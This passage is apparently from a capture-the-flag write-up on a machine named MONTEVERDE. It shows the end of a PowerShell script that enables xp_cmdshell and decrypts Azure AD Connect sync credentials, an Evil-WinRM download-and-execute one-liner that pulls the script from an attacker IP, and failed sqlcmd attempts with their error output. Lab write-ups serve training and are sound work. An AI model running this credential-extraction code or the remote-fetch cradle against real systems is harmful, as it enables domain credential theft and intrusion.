$cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe -c `"add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.                 MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key = `$null;`$km.GetActiveCredentialKey([ref]`$key);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$decrypted = `$null;`$key2.DecryptBase64ToString(''$crypted'', [ref]`$decrypted);Write-Host        `$decrypted`"'"
$reader = $cmd.ExecuteReader()

$decrypted = [string]::Empty

while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false) {
    $decrypted += $reader.GetString(0)
}

if ($decrypted -eq [string]::Empty) {
    Write-Host "[!] Error using xp_cmdshell to launch our decryption powershell"
    return
}

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerText}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host "[*] Credentials incoming...`n"

Write-Host "Domain: $($domain.Domain)"
Write-Host "Username: $($username.Username)"
Write-Host "Password: $($password.Password)"

```

Now I’ll run it just like I ran the first one. It fails at the `xp_cmdshell`:

```
*Evil-WinRM* PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentialsv2.ps1')
AD Connect Sync Credential Extract v2 (@_xpn_)
        [ Updated to support new cryptokey storage method ]

[*] Querying ADSync localdb (mms_server_configuration)
[*] Querying ADSync localdb (mms_management_agent)
[*] Using xp_cmdshell to run some Powershell as the service user
Exception calling "ExecuteReader" with "0" argument(s): "User does not have permission to perform this action.
You do not have permission to run the RECONFIGURE statement.
The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
You do not have permission to run the RECONFIGURE statement.
The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'."
At line:46 char:1
+ $reader = $cmd.ExecuteReader()
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : SqlException
Exception calling "Read" with "0" argument(s): "Invalid attempt to call Read when reader is closed."
At line:50 char:8
+ while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false)  ...
+        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : InvalidOperationException
[!] Error using xp_cmdshell to launch our decryption powershell

```

`xp_cmdshell` isn’t enabled on this DB, and our account isn’t privileged enough to enabled it.

I get the same result trying from `sqlcmd`:

```
*Evil-WinRM* PS C:\> sqlcmd -y0 -d ADSync -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
Msg 15247, Level 16, State 1, Server MONTEVERDE, Procedure sp_configure, Line 105
User does not have permission to perform this action.
Msg 5812, Level 14, State 1, Server MONTEVERDE, Line 1
You do not have permission to run the RECONFIGURE statement.
Msg 15123, Level 16, State 1, Server MONTEVERDE, Procedure sp_configure, Line 62
The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
Msg 5812, Level 14, State 1, Server MONTEVERDE, Line 1
You do not have permission to run the RECONFIGURE statement.

```